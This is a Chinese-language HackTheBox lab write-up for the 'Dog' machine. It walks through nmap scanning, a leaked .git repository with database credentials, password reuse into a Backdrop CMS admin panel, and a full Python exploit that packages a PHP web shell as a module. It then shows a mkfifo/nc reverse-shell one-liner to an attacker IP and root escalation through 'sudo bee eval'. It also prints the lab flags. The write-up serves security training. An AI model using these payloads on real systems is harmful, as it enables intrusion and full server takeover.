{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Dog","contentHtml":"<h1>Season7-Dog</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Dog\">https://app.hackthebox.com/machines/Dog</a> | <code>esay</code></p>\n</blockquote>\n<h2>前期踩点</h2>\n<p><code>10.10.11.58</code>是靶机，进行<code>nmap</code>扫描</p>\n<pre><code class=\"hljs language-bash\">root@kali  ~/Desktop/test/Dog  nmap -sT -min-rate 10000 -p-  10.10.\n11.58\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 20:55 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.58\nHost is up (0.14s latency).\nNot shown: 65478 filtered tcp ports (no-response), 55 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 24.98 seconds\n</code></pre>\n<p>扫描出来<code>.git</code>文件夹，那么可能存在<code>git</code>泄露；<code>robots.txt</code>文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Dog  nmap -sT -A -T4 -O -p 22,80 10.10.11.58   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 20:56 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.58                                              \nHost is up (0.18s latency).                                                   \n                                                                              \nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:             \n|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)                                                                                               \n|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)                                                                                              \n|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)                                                                                            \n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                          \n|_http-title: Home | Dog                                                                                                                                     \n| http-robots.txt: 22 disallowed entries (15 shown)      \n| /core/ /profiles/ /README.md /web.config /admin \n| /comment/reply /filter/tips /node/add /search /user/register \n|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-generator: Backdrop CMS 1 (https://backdropcms.org)\n| http-git:             \n|   10.10.11.58:80/.git/ \n|     Git repository found!\n|     Repository description: Unnamed repository; edit this file <span class=\"hljs-string\">'description'</span> to name the...        \n|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...\n\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        \nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A \nor 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)                                      \nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops                                                      \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel        \n                                                                              \nTRACEROUTE (using proto 1/icmp)                                               \nHOP RTT       ADDRESS                                                         \n1   179.23 ms 10.10.16.1\n2   132.86 ms 10.10.11.58\n                                       \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 32.60 seconds        \n</code></pre>\n<p>访问HTTP并收集指纹</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Dog/image36.png\" alt=\"image.png\"></p>\n<p>在主页<code>about</code>中发现域名<code>htb.dog</code>添加到hosts，并且能知道使用的是<code>Backdrop CMS</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Dog/image37.png\" alt=\"image.png\"></p>\n<h2>git 泄露</h2>\n<p>使用<code>githack</code>扒拉</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Dog  githack http://dog.htb/.git\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-Dog/image38.png\" alt=\"image.png\"></p>\n<p><code>setting.php</code>，知道配置文件在<code>./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/</code> ，并且能都得到一组账户?密码<code>root:BackDropJ2024DS2024</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$database</span> = <span class=\"hljs-string\">'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'</span>;                                                                                           \n\n<span class=\"hljs-variable\">$config_directories</span>[<span class=\"hljs-string\">'active'</span>] = <span class=\"hljs-string\">'./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active'</span>;  \n<span class=\"hljs-variable\">$config_directories</span>[<span class=\"hljs-string\">'staging'</span>] = <span class=\"hljs-string\">'./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging'</span>;  \n\n<span class=\"hljs-variable\">$settings</span>[<span class=\"hljs-string\">'hash_salt'</span>] = <span class=\"hljs-string\">'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ'</span>;                                                                                      \n</code></pre>\n<p>尝试在配置文件中进行搜索，最后通过<code>dog.htb</code>可以得到一个新用户名<code>tiffany</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Dog/site/dog.htb  grep -rE <span class=\"hljs-string\">'dog.htb'</span> ./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/\n./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        <span class=\"hljs-string\">\"tiffany@dog.htb\"</span>\n</code></pre>\n<p>密码碰撞后可以通过<code>tiffany:BackDropJ2024DS2024</code> 进入后台</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Dog/image39.png\" alt=\"image.png\"></p>\n<h2>后台利用</h2>\n<p>在后台能发现文件上传点</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Dog/image40.png\" alt=\"image.png\"></p>\n<p>但是提示未开启ZIP拓展导致无法使用</p>\n<p>在<code>?q=admin/installer/manual</code> 可以找到能使用的上传点</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Dog/image41.png\" alt=\"image.png\"></p>\n<p>通过搜索引擎能找到利用 <a href=\"https://cve-diaries.com/en-technical-analysis-of-backdrop-cms-1-27-1-remote-command-execution-rce-d9e87b2c3cae\">https://cve-diaries.com/en-technical-analysis-of-backdrop-cms-1-27-1-remote-command-execution-rce-d9e87b2c3cae</a></p>\n<p>exploit.py</p>\n<pre><code class=\"hljs language-bash\">import os\nimport <span class=\"hljs-keyword\">time</span>\nimport zipfile\n\ndef create_files():\n    info_content = <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\ntype = module\nname = Block\ndescription = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.\npackage = Layouts\ntags[] = Blocks\ntags[] = Site Architecture\nversion = BACKDROP_VERSION\nbackdrop = 1.x\nconfigure = admin/structure/block\n; Added by Backdrop CMS packaging script on 2024-03-07\nproject = backdrop\nversion = 1.27.1\ntimestamp = 1709862662\n\"</span><span class=\"hljs-string\">\"\"</span>\n    shell_info_path = <span class=\"hljs-string\">\"shell/shell.info\"</span>\n    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)\n    with open(shell_info_path, <span class=\"hljs-string\">\"w\"</span>) as file:\n        file.write(info_content)\n\n    shell_content = <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\n&#x3C;html>\n&#x3C;body>\n&#x3C;form method=\"</span>GET<span class=\"hljs-string\">\" name=\"</span>&#x3C;?php <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-built_in\">basename</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'PHP_SELF'</span>]); ?><span class=\"hljs-string\">\">\n&#x3C;input type=\"</span>TEXT<span class=\"hljs-string\">\" name=\"</span>cmd<span class=\"hljs-string\">\" autofocus id=\"</span>cmd<span class=\"hljs-string\">\" size=\"</span>80<span class=\"hljs-string\">\">\n&#x3C;input type=\"</span>SUBMIT<span class=\"hljs-string\">\" value=\"</span>Execute<span class=\"hljs-string\">\">\n&#x3C;/form>\n&#x3C;pre>\n&#x3C;?php\nif(isset(<span class=\"hljs-variable\">$_GET</span>['cmd']))\n{\nsystem(<span class=\"hljs-variable\">$_GET</span>['cmd']);\n}\n?>\n&#x3C;/pre>\n&#x3C;/body>\n&#x3C;/html>\n\"</span><span class=\"hljs-string\">\"\"</span>\n    shell_php_path = <span class=\"hljs-string\">\"shell/shell.php\"</span>\n    with open(shell_php_path, <span class=\"hljs-string\">\"w\"</span>) as file:\n        file.write(shell_content)\n\n    <span class=\"hljs-built_in\">return</span> shell_info_path, shell_php_path\n\ndef create_zip(info_path, php_path):\n    zip_filename = <span class=\"hljs-string\">\"shell.zip\"</span>\n    with zipfile.ZipFile(zip_filename, <span class=\"hljs-string\">'w'</span>) as zipf:\n        zipf.write(info_path, arcname=<span class=\"hljs-string\">'shell/shell.info'</span>)\n        zipf.write(php_path, arcname=<span class=\"hljs-string\">'shell/shell.php'</span>)\n    <span class=\"hljs-built_in\">return</span> zip_filename\n\ndef main(url):\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Backdrop CMS 1.27.1 - Remote Command Execution Exploit\"</span>)\n    time.sleep(3)\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Evil module generating...\"</span>)\n    time.sleep(2)\n\n    info_path, php_path = create_files()\n    zip_filename = create_zip(info_path, php_path)\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Evil module generated!\"</span>, zip_filename)\n    time.sleep(2)\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Go to \"</span> + url + <span class=\"hljs-string\">\"/admin/modules/install and upload the \"</span> + zip_filename + <span class=\"hljs-string\">\" for Manual Installation.\"</span>)\n    time.sleep(2)\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your shell address:\"</span>, url + <span class=\"hljs-string\">\"/modules/shell/shell.php\"</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    import sys\n    <span class=\"hljs-keyword\">if</span> len(sys.argv) &#x3C; 2:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Usage: python script.py [url]\"</span>)\n    <span class=\"hljs-keyword\">else</span>:\n        main(sys.argv[1])\n</code></pre>\n<p>运行后即可拿到后台文件</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Dog/image42.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Dog/image43.png\" alt=\"image.png\"></p>\n<p>填入反弹shell命令，即可获得<code>shell</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">rm</span> /tmp/f;<span class=\"hljs-built_in\">mkfifo</span> /tmp/f;<span class=\"hljs-built_in\">cat</span> /tmp/f|/bin/bash -i 2>&#x26;1|nc 10.10.16.4 1234 >/tmp/f\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Dog  nc -lvnp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.11.58] 52554\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (1003): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nwww-data@dog:/var/www/html/modules/shell$ \n</code></pre>\n<h2>提权</h2>\n<p>查看后台运行的程序</p>\n<pre><code class=\"hljs language-bash\">www-data@dog:/var/www/html$ ss -tupl\nss -tupl\nNetid State   Recv-Q  Send-Q   Local Address:Port     Peer Address:Port Process \nudp   UNCONN  0       0              0.0.0.0:bootpc        0.0.0.0:*            \nudp   UNCONN  0       0        127.0.0.53%lo:domain        0.0.0.0:*            \ntcp   LISTEN  0       70           127.0.0.1:33060         0.0.0.0:*            \ntcp   LISTEN  0       151          127.0.0.1:mysql         0.0.0.0:*            \ntcp   LISTEN  0       4096     127.0.0.53%lo:domain        0.0.0.0:*            \ntcp   LISTEN  0       128            0.0.0.0:ssh           0.0.0.0:*            \ntcp   LISTEN  0       511                  *:http                *:*            \ntcp   LISTEN  0       128               [::]:ssh              [::]:*  \n</code></pre>\n<p>之前有拿到一个数据库的账号密码，尝试进行mysql登录，但是会一直卡住</p>\n<pre><code class=\"hljs language-bash\">www-data@dog:/var/www/html/modules/shell$ mysql -u root -p\nmysql -u root -p\nEnter password: BackDropJ2024DS2024\n^[OP\n</code></pre>\n<p>查看<code>/etc/passwd</code></p>\n<pre><code class=\"hljs language-bash\">www-data@dog:/var/www/html/modules/shell$ <span class=\"hljs-built_in\">cat</span> /etc/passwd\n<span class=\"hljs-built_in\">cat</span> /etc/passwd                                                               \nroot:x:0:0:root:/root:/bin/bash                                               \ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                             \nbin:x:2:2:bin:/bin:/usr/sbin/nologin                                          \nsys:x:3:3:sys:/dev:/usr/sbin/nologin                                          \n<span class=\"hljs-built_in\">sync</span>:x:4:65534:<span class=\"hljs-built_in\">sync</span>:/bin:/bin/sync                                            \ngames:x:5:60:games:/usr/games:/usr/sbin/nologin \nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin   \nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin           \nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin          \nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nroxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                    \nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin                          \nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                                                             \ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                                                                            \nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin                                                                       \nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  \nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin                                                                    \nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin                              \n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin          \ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false                                                                                                  \nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin                                 \ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin        \nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin                     \npollinate:x:110:1::/var/cache/pollinate:/bin/false                            \nfwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin            \nsshd:x:113:65534::/run/sshd:/usr/sbin/nologin                                 \nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin            \njobert:x:1000:1000:jobert:/home/jobert:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nmysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false\njohncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash\n_laurel:x:997:997::/var/log/laurel:/bin/false    \n</code></pre>\n<p>我们要当前目标用户是<code>jobert</code>和<code>johncusack</code> ，权限问题无法查看其家目录内容</p>\n<p>再尝试密码碰撞，使用<code>BackDropJ2024DS2024</code> ，使用用户<code>johncusack</code> 成功碰撞…</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Dog  ssh johncusack@dog.htb\nThe authenticity of host <span class=\"hljs-string\">'dog.htb (10.10.11.58)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o. \nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>dog.htb<span class=\"hljs-string\">' (ED25519) to the list of known hosts.\njohncusack@dog.htb'</span>s password:                                                \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)                                                                                           \n                                                                              \n * Documentation:  https://help.ubuntu.com                                                                                                                   \n * Management:     https://landscape.canonical.com  \n * Support:        https://ubuntu.com/pro       \n                                                                              \n System information as of Tue 04 Mar 2025 03:55:57 PM UTC  \n                                                                              \n  System load:           0.63                                                 \n  Usage of /:            55.6% of 6.32GB                 \n  Memory usage:          16%                                                  \n  Swap usage:            0%                                                   \n  Processes:             258                                                  \n  Users logged <span class=\"hljs-keyword\">in</span>:       0                                                    \n  IPv4 address <span class=\"hljs-keyword\">for</span> eth0: 10.10.11.58                                          \n  IPv6 address <span class=\"hljs-keyword\">for</span> eth0: dead:beef::250:56ff:feb9:b2de\n                                                                              \n                                                                              \nExpanded Security Maintenance <span class=\"hljs-keyword\">for</span> Applications is not enabled.\n                                                                              \n0 updates can be applied immediately.                                         \n                                                                              \nEnable ESM Apps to receive additional future security updates.        \nSee https://ubuntu.com/esm or run: <span class=\"hljs-built_in\">sudo</span> pro status                                                                                                           \n                                                                              \n                                                                              \njohncusack@dog:~$                                                         \n</code></pre>\n<p>查看权限，可以以root权限运行<code>bee</code></p>\n<pre><code class=\"hljs language-bash\">johncusack@dog:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> johncusack: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> johncusack on dog:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser johncusack may run the following commands on dog:\n    (ALL : ALL) /usr/local/bin/bee\n</code></pre>\n<pre><code class=\"hljs language-bash\">johncusack@dog:~$ <span class=\"hljs-built_in\">sudo</span> bee             \n🐝 Bee                                 \nUsage: bee [global-options] &#x3C;<span class=\"hljs-built_in\">command</span>> [options] [arguments]                                                                                                  \n                                                                                                                                                             \nGlobal Options:                                                               \n --root                                                                       \n Specify the root directory of the Backdrop installation to use. If not <span class=\"hljs-built_in\">set</span>, will try to find the Backdrop installation automatically based on the current di\nrectory.                                                                      \n                                                                              \n --site                \n Specify the directory name or URL of the Backdrop site to use (as defined <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">'sites.php'</span>). If not <span class=\"hljs-built_in\">set</span>, will try to find the Backdrop site automatically base\nd on the current directory.                                                   \n                                                                              \n --base-url                \n Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.\n                                                                              \n --<span class=\"hljs-built_in\">yes</span>, -y                                                                    \n Answer <span class=\"hljs-string\">'yes'</span> to questions without prompting.    \n --debug, -d                                                                  \n Enables <span class=\"hljs-string\">'debug'</span> mode, <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">which</span> <span class=\"hljs-string\">'debug'</span> and <span class=\"hljs-string\">'log'</span> <span class=\"hljs-built_in\">type</span> messages will be displayed (<span class=\"hljs-keyword\">in</span> addition to all other messages).                                       \n                                       \n                                                                              \nCommands:                                                                     \n CONFIGURATION                                                                                                                                               \n  config-export                                                                                                                                              \n   cex, bcex                                                                  \n   Export config from the site.        \n                                       \n  config-get                           \n   cget                                                                                                                                                      \n   Get the value of a specific config option, or view all the config options <span class=\"hljs-keyword\">in</span> a given file.                                                                \n                                                                              \n  config-import                                                               \n   cim, bcim                                                                                                                                                 \n   Import config into the site.                                               \n                                                                              \n  config-set           \n   cset                                                                                                                                                      \n   Set the value of an option <span class=\"hljs-keyword\">in</span> a config file.                               \n                                                                              \n CORE                      \n  download-core                                                                                                                                              \n   dl-core                                                                    \n   Download Backdrop core.                                                    \n install                                                                     \n   si, site-install                                                           \n   Install Backdrop and setup a new site.                                                                                                                    \n                                       \n DATABASE                                                                     \n  db-drop                                                                     \n   sql-drop                                                                                                                                                  \n   Drop the current database and recreate an empty database with the same details. This could be used prior to import <span class=\"hljs-keyword\">if</span> the target database has more tables \nthan the <span class=\"hljs-built_in\">source</span> database.                                                     \n                                       \n  db-export                            \n   dbex, db-dump, sql-export, sql-dump \n   Export the database as a compressed SQL file. This uses the --no-tablespaces option by default.                                                           \n                                                                                                                                                             \n  db-import                                                                   \n   dbim, sql-import                                                           \n   Import an SQL file into the current database.                                                                                                             \n                                                                              \n INFORMATION                                                                  \n  <span class=\"hljs-built_in\">help</span>                 \n   Provide <span class=\"hljs-built_in\">help</span> and examples <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'bee'</span> and its commands.                                                                                                     \n                                                                              \n  <span class=\"hljs-built_in\">log</span>                                                                         \n   ws, dblog, watchdog-show\n   Show database <span class=\"hljs-built_in\">log</span> messages.                                                                                                                               \n                                                                              \n  status                                                                      \n   st, info, core-status                                                      \n   Provides an overview of the current Backdrop installation/site.           \n                                                                               \n  version                                                                                                                                                    \n   Display the current version of Bee. \n                                                                              \n MISCELLANEOUS                                                                \n  cache-clear                                                                                                                                                \n   cc                                                                                                                                                        \n   Clear a specific cache, or all Backdrop caches.                            \n                                       \n  cron                                 \n   Run cron.                           \n                                                                                                                                                             \n  maintenance-mode                                                                                                                                           \n   mm                                                                         \n   Enable or <span class=\"hljs-built_in\">disable</span> maintenance mode <span class=\"hljs-keyword\">for</span> Backdrop.                           \n                                                                                                                                                             \n PROJECTS                                                                     \n  <span class=\"hljs-built_in\">disable</span>                                                                     \n   dis, pm-disable     \n   Disable one or more projects (modules, themes, layouts).                                                                                                  \n                                                                              \n  download                                                                    \n   dl, pm-download         \n   Download Backdrop contrib projects.                                                                                                                       \n                                                                              \n  <span class=\"hljs-built_in\">enable</span>                                                                      \n   en, pm-enable                                                              \n   Enable one or more projects (modules, themes, layouts).       \n\tprojects                                                                                                                                                   \n   pml, pmi, project, pm-list, pm-info \n   Display information about available projects (modules, themes, layouts).   \n                                                                              \n  uninstall                                                                                                                                                  \n   pmu, pm-uninstall                                                                                                                                         \n   Uninstall one or more modules.                                             \n                                       \n ROLES                                 \n  permissions                          \n   pls, permissions-list                                                                                                                                     \n   List all permissons of the modules.                                                                                                                       \n                                                                              \n  role-add-perm                                                               \n   rap                                                                                                                                                       \n   Grant specified permission(s) to a role.                                   \n                                                                              \n  role-create          \n   rcrt                                                                                                                                                      \n   Add a role.                                                                \n                                                                              \n  role-delete              \n   rdel                                                                                                                                                      \n   Delete a role.                                                             \n                                                                              \n  role-remove-perm                                                            \n   rrp          \n USERS                                                                                                                                                       \n  user-add-role                        \n   urole, urol                                                                \n   Add role to user.                                                          \n                                                                                                                                                             \n  user-block                                                                                                                                                 \n   ublk                                                                       \n   Block a user.                       \n                                       \n  user-cancel                          \n   ucan                                                                                                                                                      \n   Cancel/remove a user.                                                                                                                                     \n                                                                              \n  user-create                                                                 \n   ucrt                                                                                                                                                      \n   Create a user account with the specified name.                             \n                                                                              \n  user-login           \n   uli                                                                                                                                                       \n   Display a login <span class=\"hljs-built_in\">link</span> <span class=\"hljs-keyword\">for</span> a given user.                                     \n                                                                              \n  user-password            \n   upw, upwd                                                                                                                                                 \n   Reset the login password <span class=\"hljs-keyword\">for</span> a given user.                                 \n                                                                              \n  user-remove-role                                                            \n   urrole, urrol \n                                                                                                                                                              \n  user-unblock                         \n   uublk                                                                      \n   Unblock a user.                                                            \n                                                                                                                                                             \n  <span class=\"hljs-built_in\">users</span>                                                                                                                                                      \n   uls, user-list                                                             \n   List all user accounts.             \n                                       \n ADVANCED                              \n  db-query                                                                                                                                                   \n   dbq                                                                                                                                                       \n   Execute a query using db_query().                                          \n                                                                              \n  <span class=\"hljs-built_in\">eval</span>                                                                                                                                                       \n   ev, php-eval                                                               \n   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.    \n                                       \n  php-script                                                                                                                                                 \n   scr                                                                        \n   Execute an arbitrary PHP file after bootstrapping Backdrop.                \n                                       \n  sql                                                                                                                                                        \n   sqlc, sql-cli, db-cli                                                      \n   Open an SQL command-line interface using Backdrop<span class=\"hljs-string\">'s database credentials.  \n</span></code></pre>\n<p>对参数进行测试，通过以下命令成功以<code>root</code>身份命令执行</p>\n<pre><code class=\"hljs language-bash\">johncusack@dog:~$ <span class=\"hljs-built_in\">sudo</span> bee --root=/var/www/html <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"system(id)\"</span>\n\n ⚠  Warning: Use of undefined constant <span class=\"hljs-built_in\">id</span> - assumed <span class=\"hljs-string\">'id'</span> (this will throw an Error <span class=\"hljs-keyword\">in</span> a future version of PHP)\n<span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">eval</span>() (line 1 of /backdrop_tool/bee/commands/php.bee.inc(51) : <span class=\"hljs-built_in\">eval</span>()<span class=\"hljs-string\">'d code).\n\nuid=0(root) gid=0(root) groups=0(root)\n</span></code></pre>\n<p>获得<code>root shell</code></p>\n<pre><code class=\"hljs language-bash\">johncusack@dog:~$ <span class=\"hljs-built_in\">sudo</span> bee --root=/var/www/html <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"system('/bin/bash')\"</span>\nroot@dog:/var/www/html# \n</code></pre>\n<h2>Flag</h2>\n<pre><code class=\"hljs language-bash\">root@dog:/var/www/html# <span class=\"hljs-built_in\">cat</span> /home/johncusack/user.txt \nfb94f5fef9c1ed963af3eeccffb86867\nroot@dog:/var/www/html# <span class=\"hljs-built_in\">cat</span> /root/root.txt \n4b4e17fb473d44908a538e2f99b27e8d\n</code></pre>\n<h2>总结</h2>\n<p>git泄露，后台文件上传利用，上传点不好找，还有就是密码碰撞，下次将密码碰撞优先级提高一些</p>","title":"HackTheBox - Season7-Dog","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","Linux靶机"],"categories":"靶机","description":"Season7-Dog\n\n https://app.hackthebox.com/machines/Dog | `esay`\n \n\n前期踩点\n\n`10.10.11.58`是靶机，进行`nmap`扫描\n\n\n\n扫描出来`.git`文件夹，那么可能存在`git`泄露；`robots.txt`文件\n\n\n\n访问HTTP并收集指纹\n\n\n\n在主页`about`中发现域名`htb.dog`添加到hosts，并且能..."},"recentPosts":[{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"}]},"__N_SSG":true}